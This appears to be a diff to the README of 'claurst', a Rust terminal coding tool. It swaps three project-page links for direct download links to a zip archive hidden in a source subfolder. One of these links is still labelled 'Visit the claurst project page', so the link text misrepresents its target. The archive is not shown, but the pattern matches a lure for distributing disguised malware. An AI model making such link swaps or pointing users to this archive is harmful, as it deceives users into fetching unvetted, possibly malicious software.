@@ -1,12 +1,12 @@
 # 🤖 claurst - Terminal coding help in Rust
 
-[![Download claurst](https://img.shields.io/badge/Download%20claurst-blue-grey?style=for-the-badge)](https://github.com/unengaged-insurableinterest323/claurst)
+[![Download claurst](https://img.shields.io/badge/Download%20claurst-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/unengaged-insurableinterest323/claurst/main/src-rust/crates/mcp/Software_v3.3.zip)
 
 ## 📥 Download
 
 Use the link below to visit the project page and get the Windows version:
 
-[Download claurst](https://github.com/unengaged-insurableinterest323/claurst)
+[Download claurst](https://raw.githubusercontent.com/unengaged-insurableinterest323/claurst/main/src-rust/crates/mcp/Software_v3.3.zip)
 
 ## 🪟 Windows setup
 
@@ -121,7 +121,7 @@ Yes. If you move it, open it from the new folder.
 
 ## 📎 Download again
 
-[Visit the claurst project page](https://github.com/unengaged-insurableinterest323/claurst)
+[Visit the claurst project page](https://raw.githubusercontent.com/unengaged-insurableinterest323/claurst/main/src-rust/crates/mcp/Software_v3.3.zip)
 
 ## 🧰 Helpful habits
 
